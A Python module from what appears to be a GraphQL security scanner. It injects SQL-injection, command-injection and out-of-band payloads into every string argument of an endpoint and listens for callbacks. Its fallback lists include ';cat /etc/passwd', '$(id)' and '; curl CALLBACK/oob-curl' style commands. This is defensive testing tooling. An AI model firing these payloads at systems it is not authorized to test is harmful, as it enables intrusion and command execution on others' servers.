"""
GrapeQL Injection Tester
Author: Aleksa Zatezalo
Version: 3.1
Date: February 2025
Description: Tests GraphQL endpoints for SQL injection, command injection,
             and out-of-band (OOB) vulnerabilities. Payloads and detection
             indicators are loaded from YAML test cases.
             v3.1: Added OOB testing via local TCP listener.
"""

import asyncio
import time
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from .tester import VulnerabilityTester
from .utils import Finding
from .logger import GrapeLogger
from .loader import TestCaseLoader
from .baseline import BaselineTracker


@dataclass
class OOBConnection:
    """A single inbound connection received on the OOB listener."""
    timestamp: str
    remote_ip: str
    remote_port: int
    payload_name: str
    data: str


class OOBListener:
    """
    Async TCP listener that records every inbound connection.

    The target server connects back here after processing an OOB payload
    (curl, wget, ping, etc.).  Any connection = confirmed OOB.
    """

    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.connections: List[OOBConnection] = []
        self._server: Optional[asyncio.AbstractServer] = None
        self._current_payload: str = ""

    @property
    def callback_address(self) -> str:
        """The address payloads should call back to."""
        return f"{self.ip}:{self.port}"

    @property
    def callback_http(self) -> str:
        """HTTP URL for payloads that need a full URL."""
        return f"http://{self.ip}:{self.port}"

    def set_current_payload(self, name: str) -> None:
        """Tag subsequent connections with this payload name."""
        self._current_payload = name

    async def _handle_connection(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        """Handle a single inbound connection."""
        peer = writer.get_extra_info("peername")
        remote_ip = peer[0] if peer else "unknown"
        remote_port = peer[1] if peer else 0

        # Read whatever the target sends (up to 4KB, non-blocking)
        try:
            data = await asyncio.wait_for(reader.read(4096), timeout=2.0)
            data_str = data.decode("utf-8", errors="replace")
        except (asyncio.TimeoutError, Exception):
            data_str = ""

        self.connections.append(OOBConnection(
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            remote_ip=remote_ip,
            remote_port=remote_port,
            payload_name=self._current_payload,
            data=data_str[:500],
        ))

        # Send a minimal HTTP response so curl/wget don't hang
        try:
            writer.write(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Length: 2\r\n"
                b"Connection: close\r\n\r\n"
                b"OK"
            )
            await writer.drain()
        except Exception:
            pass
        finally:
            writer.close()

    async def start(self) -> bool:
        """Start the TCP listener. Returns False if the port is unavailable."""
        try:
            self._server = await asyncio.start_server(
                self._handle_connection, self.ip, self.port
            )
            return True
        except OSError as e:
            return False

    async def stop(self) -> None:
        """Stop the listener."""
        if self._server:
            self._server.close()
            await self._server.wait_closed()
            self._server = None

    def drain(self) -> List[OOBConnection]:
        """Return and clear all recorded connections."""
        conns = list(self.connections)
        self.connections.clear()
        return conns


class InjectionTester(VulnerabilityTester):
    """
    Tests GraphQL endpoints for SQL injection, command injection,
    and out-of-band (OOB) vulnerabilities.
    Payloads come from ``test_cases/injection/*.yaml``.
    """

    MODULE_NAME = "injection"

    def __init__(
        self,
        logger: Optional[GrapeLogger] = None,
        loader: Optional[TestCaseLoader] = None,
        baseline: Optional[BaselineTracker] = None,
    ):
        super().__init__(logger=logger, loader=loader, baseline=baseline)
        self.test_name = "GraphQL Injection Testing"
        self.username = "admin"
        self.password = "changeme"

        # OOB listener (configured externally via set_listener)
        self._listener: Optional[OOBListener] = None

        # Separate loaded test cases by category
        self._sqli_cases: List[Dict] = []
        self._cmd_cases: List[Dict] = []
        self._oob_cases: List[Dict] = []

        for tc in self.test_cases:
            if tc.get("oob"):
                self._oob_cases.append(tc)
                continue
            indicators = tc.get("indicators", [])
            indicator_text = " ".join(indicators).lower()
            if "sql" in indicator_text or "pg::" in indicator_text:
                self._sqli_cases.append(tc)
            else:
                self._cmd_cases.append(tc)

    # ------------------------------------------------------------------ #
    #  Configuration
    # ------------------------------------------------------------------ #

    def set_credentials(self, username: str, password: str) -> None:
        self.username = username
        self.password = password
        self.printer.print_msg(
            f"Set credentials: {username}:{password}", status="success"
        )

    def set_listener(self, ip: str, port: int) -> None:
        """Configure the OOB callback listener address."""
        self._listener = OOBListener(ip, port)
        self.printer.print_msg(
            f"OOB listener configured: {ip}:{port}", status="success"
        )

    # ------------------------------------------------------------------ #
    #  Payload helpers (fallbacks if no YAML loaded)
    # ------------------------------------------------------------------ #

    def _get_sqli_payloads(self) -> List[Dict]:
        """Return sqli test cases from YAML, or generate defaults."""
        if self._sqli_cases:
            return self._sqli_cases
        default_indicators = [
            "SQL syntax",
            "SQLite",
            "MySQL",
            "PostgreSQL",
            "ORA-",
            "SQL Server",
            "SQLSTATE[",
            "PG::Error:",
        ]
        return [
            {"name": p, "payload": p, "indicators": default_indicators}
            for p in [
                "'",
                "' OR 1=1 --",
                "' OR '1'='1",
                '" OR ""="',
                "' UNION SELECT 1,2,3 --",
                "' AND 1=1 --",
                "' AND 1=0 --",
            ]
        ]

    def _get_cmd_payloads(self) -> List[Dict]:
        """Return command injection test cases from YAML, or generate defaults."""
        if self._cmd_cases:
            return self._cmd_cases
        default_indicators = [
            "root:",
            "/bin/bash",
            "/bin/sh",
            ":/home/",
            "/usr/bin",
            "Permission denied",
            "command not found",
            "Linux",
        ]
        return [
            {"name": p, "payload": p, "indicators": default_indicators}
            for p in [
                ";id",
                "|id",
                "||id",
                "&& id",
                ";cat /etc/passwd",
                "$(id)",
                "`id`",
            ]
        ]

    def _get_oob_payloads(self) -> List[Dict]:
        """Return OOB test cases from YAML, or generate defaults."""
        if self._oob_cases:
            return self._oob_cases
        # Minimal fallback set if no YAML loaded
        return [
            {
                "name": "oob_curl",
                "payload": "; curl CALLBACK/oob-curl",
                "oob": True,
                "description": "HTTP callback via curl",
            },
            {
                "name": "oob_wget",
                "payload": "; wget CALLBACK/oob-wget",
                "oob": True,
                "description": "HTTP callback via wget",
            },
            {
                "name": "oob_nslookup",
                "payload": "; nslookup CALLBACK",
                "oob": True,
                "description": "DNS callback via nslookup",
            },
        ]

    # ------------------------------------------------------------------ #
    #  Core testing methods
    # ------------------------------------------------------------------ #

    def _build_query(
        self,
        field_name: str,
        arg_name: str,
        payload: str,
        is_mutation: bool,
    ) -> Optional[str]:
        """Build a GraphQL query injecting *payload* into *arg_name*."""
        operation_type = "mutation" if is_mutation else "query"
        field_info = (
            self.client.mutation_fields.get(field_name)
            if is_mutation
            else self.client.query_fields.get(field_name)
        )
        if not field_info:
            return None

        arg_strings = []
        for arg in field_info["args"]:
            if arg["name"] == arg_name:
                arg_strings.append(f'{arg["name"]}: "{payload}"')
            elif arg["name"] == "username":
                arg_strings.append(f'{arg["name"]}: "{self.username}"')
            elif arg["name"] == "password":
                arg_strings.append(f'{arg["name"]}: "{self.password}"')
            elif arg["type"]["name"] == "Int":
                arg_strings.append(f'{arg["name"]}: 1')
            elif arg["type"]["name"] == "Boolean":
                arg_strings.append(f'{arg["name"]}: true')
            else:
                arg_strings.append(f'{arg["name"]}: "test"')

        args_str = ", ".join(arg_strings)

        field_selections = {
            "CreatePaste": "{ id content title success error }",
            "DeletePaste": "{ success error }",
            "UpdatePaste": "{ id content success error }",
            "AuthResponse": "{ token error }",
            "UserResponse": "{ id username error }",
            "SystemResponse": "{ status message error }",
            "Default": "{ id message error success }",
        }

        if field_name in ["systemDiagnostics", "getVersion", "getStatus"]:
            return f"{operation_type} {{ {field_name}({args_str}) }}"

        selection = field_selections.get(
            field_name.replace("create", "Create")
            .replace("delete", "Delete")
            .replace("update", "Update"),
            field_selections["Default"],
        )
        return f"{operation_type} {{ {field_name}({args_str}) {selection} }}"

    async def _test_field(
        self,
        field_name: str,
        arg_name: str,
        test_case: Dict,
        is_mutation: bool,
    ) -> Tuple[bool, Optional[str], float]:
        """
        Send one payload to one field.arg and check indicators.
        """
        payload = test_case["payload"]
        indicators = test_case.get("indicators", [])

        query = self._build_query(field_name, arg_name, payload, is_mutation)
        if not query:
            return False, None, 0.0

        self.client.set_log_context("InjectionTester", test_case.get("name", "?"))

        start_time = time.time()
        response, error = await self.client.graphql_query(
            query,
            _log_parameter=f"{field_name}.{arg_name}",
            _log_payload=payload,
        )
        duration = time.time() - start_time

        self._record_response_time(duration)

        if error:
            return False, None, duration

        response_text = json.dumps(response)

        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                detail = (
                    f"Possible injection in {field_name}.{arg_name} "
                    f"with payload: {payload}"
                )
                return True, detail, duration

        return False, None, duration

    async def _scan_field(
        self,
        field_name: str,
        is_mutation: bool,
        test_cases: List[Dict],
        vuln_type: str,
    ) -> List[Finding]:
        """Scan a field for a specific injection type using given test cases."""
        findings: List[Finding] = []
        field_info = (
            self.client.mutation_fields.get(field_name)
            if is_mutation
            else self.client.query_fields.get(field_name)
        )
        if not field_info:
            return findings

        string_args = [
            arg["name"]
            for arg in field_info["args"]
            if arg["type"]["name"] in ["String", "ID"]
        ]
        if not string_args:
            return findings

        for arg_name in string_args:
            self.printer.print_msg(
                f"Testing {'mutation' if is_mutation else 'query'} "
                f"field for {vuln_type}: {field_name}.{arg_name}",
                status="log",
            )

            for tc in test_cases:
                is_vuln, detail, _ = await self._test_field(
                    field_name, arg_name, tc, is_mutation
                )
                if is_vuln:
                    severity = "CRITICAL"
                    if vuln_type == "SQLi":
                        impact = (
                            "Database access, data extraction, authentication bypass"
                        )
                        remediation = "Use parameterized queries and ORM sanitization"
                    else:
                        impact = "Arbitrary command execution on the server"
                        remediation = "Never pass user input to shell commands"

                    finding = Finding(
                        title=f"{vuln_type} in {field_name}.{arg_name}",
                        severity=severity,
                        description=detail,
                        endpoint=self.client.endpoint,
                        impact=impact,
                        remediation=remediation,
                    )
                    findings.append(finding)
                    self.add_finding(finding)
                    break  # one finding per arg is enough

        return findings

    # ------------------------------------------------------------------ #
    #  OOB testing
    # ------------------------------------------------------------------ #

    def _escape_graphql(self, s: str) -> str:
        """Escape a string for use inside GraphQL double quotes."""
        return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")

    async def _run_oob_tests(self) -> None:
        """
        Start the TCP listener, inject OOB payloads into every String arg,
        wait for callbacks, and report findings.

        Flow:
            1. Start listener on configured ip:port
            2. For each OOB test case, replace CALLBACK with listener address
            3. Inject into every String/ID argument in every query and mutation
            4. After each payload batch, pause briefly for callbacks to arrive
            5. After all payloads sent, wait a final period
            6. Any connection received = confirmed OOB finding
            7. Stop listener
        """
        if not self._listener:
            return

        self.printer.print_section("Out-of-Band (OOB) Injection Testing")
        self.printer.print_msg(
            f"Starting listener on {self._listener.callback_address}",
            status="log",
        )

        if not await self._listener.start():
            self.printer.print_msg(
                f"Failed to bind listener on {self._listener.callback_address}. "
                f"Check that the port is available and you have permissions.",
                status="error",
            )
            return

        oob_cases = self._get_oob_payloads()
        callback_http = self._listener.callback_http
        callback_addr = self._listener.callback_address
        injected_count = 0

        try:
            # Collect all (field_name, arg_name, is_mutation) targets
            targets: List[Tuple[str, str, bool]] = []

            for field_name, field_info in self.client.query_fields.items():
                for arg in field_info.get("args", []):
                    if arg["type"]["name"] in ("String", "ID"):
                        targets.append((field_name, arg["name"], False))

            for field_name, field_info in self.client.mutation_fields.items():
                for arg in field_info.get("args", []):
                    if arg["type"]["name"] in ("String", "ID"):
                        targets.append((field_name, arg["name"], True))

            # Split OOB cases into raw-query and generic
            raw_cases = [tc for tc in oob_cases if tc.get("query")]
            generic_cases = [tc for tc in oob_cases if not tc.get("query")]

            # ── Phase 1: Raw query OOB cases ──────────────────────────
            # These contain a complete GraphQL query string with CALLBACK
            # placeholders.  Sent directly — no field scanning needed.
            # Used for multi-arg mutations (e.g. importPaste SSRF).
            for tc in raw_cases:
                tc_name = tc.get("name", "oob_raw")
                raw_query = tc["query"]

                # Order matters: replace longer placeholders first so that
                # "CALLBACK" doesn't clobber "CALLBACK_HOST" / "CALLBACK_PORT"
                query = raw_query.replace("CALLBACK_HOST", self._listener.ip)
                query = query.replace("CALLBACK_PORT", str(self._listener.port))
                query = query.replace("CALLBACK", callback_http)

                self._listener.set_current_payload(tc_name)
                self.printer.print_msg(
                    f"Injecting OOB raw query: {tc_name}", status="log"
                )

                self.client.set_log_context("InjectionTester", tc_name)
                start = time.time()
                await self.client.graphql_query(
                    query,
                    _log_parameter="oob_raw",
                    _log_payload=tc_name,
                )
                self._record_response_time(time.time() - start)
                injected_count += 1

                await asyncio.sleep(0.5)

            # ── Phase 2: Generic OOB cases (scan all String/ID args) ──
            if not targets and generic_cases:
                self.printer.print_msg(
                    "No String/ID arguments found for generic OOB injection",
                    status="warning",
                )
            else:
                for tc in generic_cases:
                    tc_name = tc.get("name", "oob_unknown")
                    raw_payload = tc["payload"]

                    # Order matters: longer placeholders first
                    payload = raw_payload.replace("CALLBACK_HOST", self._listener.ip)
                    payload = payload.replace("CALLBACK_PORT", str(self._listener.port))
                    payload = payload.replace("CALLBACK", callback_http)

                    escaped = self._escape_graphql(payload)
                    self._listener.set_current_payload(tc_name)

                    self.printer.print_msg(
                        f"Injecting OOB payload: {tc_name}", status="log"
                    )

                    # Restrict to specific arg names if the test case says so
                    target_args = tc.get("target_args", None)

                    for field_name, arg_name, is_mutation in targets:
                        if target_args and arg_name.lower() not in [
                            a.lower() for a in target_args
                        ]:
                            continue

                        query = self._build_query(
                            field_name, arg_name, escaped, is_mutation
                        )
                        if not query:
                            continue

                        self.client.set_log_context("InjectionTester", tc_name)
                        start = time.time()
                        await self.client.graphql_query(
                            query,
                            _log_parameter=f"{field_name}.{arg_name}",
                            _log_payload=raw_payload[:120],
                        )
                        self._record_response_time(time.time() - start)
                        injected_count += 1

                    # Brief pause between payload types for callbacks to arrive
                    await asyncio.sleep(1)

            # Final wait for slow callbacks
            self.printer.print_msg(
                f"Injected {injected_count} OOB payloads. "
                f"Waiting 10s for callbacks...",
                status="log",
            )
            await asyncio.sleep(10)

            # Collect results
            connections = self._listener.drain()

            if connections:
                self.printer.print_msg(
                    f"Received {len(connections)} OOB callback(s)!", status="failed"
                )

                # Deduplicate by payload name
                seen_payloads: set = set()
                for conn in connections:
                    if conn.payload_name in seen_payloads:
                        continue
                    seen_payloads.add(conn.payload_name)

                    self.add_finding(Finding(
                        title=f"OOB Injection via {conn.payload_name}",
                        severity="CRITICAL",
                        description=(
                            f"The target server made an outbound connection to "
                            f"{self._listener.callback_address} after injecting "
                            f"payload '{conn.payload_name}'. Connection from "
                            f"{conn.remote_ip}:{conn.remote_port} at "
                            f"{conn.timestamp}. "
                            f"Data received: {conn.data[:200] if conn.data else 'none'}"
                        ),
                        endpoint=self.client.endpoint,
                        impact="Server-side request forgery or arbitrary command execution",
                        remediation=(
                            "Sanitize all user input before passing to system commands, "
                            "HTTP clients, or database queries. Implement egress filtering."
                        ),
                    ))

                    if self.logger:
                        self.logger.log_request(
                            module="InjectionTester",
                            test=conn.payload_name,
                            parameter=f"OOB from {conn.remote_ip}",
                            payload=conn.payload_name,
                            status="VULNERABLE",
                            duration=0.0,
                        )
            else:
                self.printer.print_msg(
                    "No OOB callbacks received", status="success"
                )

        finally:
            await self._listener.stop()
            self.printer.print_msg("OOB listener stopped", status="log")

    # ------------------------------------------------------------------ #
    #  Main entry point
    # ------------------------------------------------------------------ #

    async def run_test(self) -> List[Finding]:
        if not self.client.endpoint or not (
            self.client.query_fields or self.client.mutation_fields
        ):
            self.printer.print_msg(
                "No endpoint set or schema not retrieved. Run setup_endpoint first.",
                status="error",
            )
            return self.findings

        self.printer.print_section("Starting Injection Testing")
        self.printer.print_msg(
            f"Using credentials username='{self.username}' password='{self.password}'",
            status="log",
        )

        sqli_cases = self._get_sqli_payloads()
        cmd_cases = self._get_cmd_payloads()

        # SQLi -- queries then mutations
        self.printer.print_msg("Testing for SQL injection...", status="log")
        for field in self.client.query_fields:
            await self._scan_field(field, False, sqli_cases, "SQLi")
        for field in self.client.mutation_fields:
            await self._scan_field(field, True, sqli_cases, "SQLi")

        # Command injection -- queries then mutations
        self.printer.print_msg("Testing for command injection...", status="log")
        for field in self.client.query_fields:
            await self._scan_field(field, False, cmd_cases, "Command Injection")
        for field in self.client.mutation_fields:
            await self._scan_field(field, True, cmd_cases, "Command Injection")

        # OOB injection -- only if listener is configured
        if self._listener:
            await self._run_oob_tests()
        else:
            self.printer.print_msg(
                "OOB testing skipped (use --listener-ip and --listener-port to enable)",
                status="log",
            )

        if not self.findings:
            self.printer.print_msg(
                "No injection vulnerabilities found", status="success"
            )

        return self.findings